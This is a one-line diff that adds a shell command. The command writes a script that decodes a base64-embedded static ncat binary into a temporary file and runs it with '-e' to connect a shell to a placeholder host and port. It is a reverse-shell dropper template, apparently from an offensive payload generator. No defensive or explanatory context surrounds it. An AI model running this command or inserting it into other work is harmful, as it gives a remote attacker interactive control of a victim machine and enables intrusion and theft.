@@ -1,0 +1,1 @@
+echo 'cp -p *\shell* *\tmp*; echo "'`base64 ./ncat-static`'" | base64 -di > *\tmp*; *\tmp* -e *\shell* *\host* *\port*' > *\script*
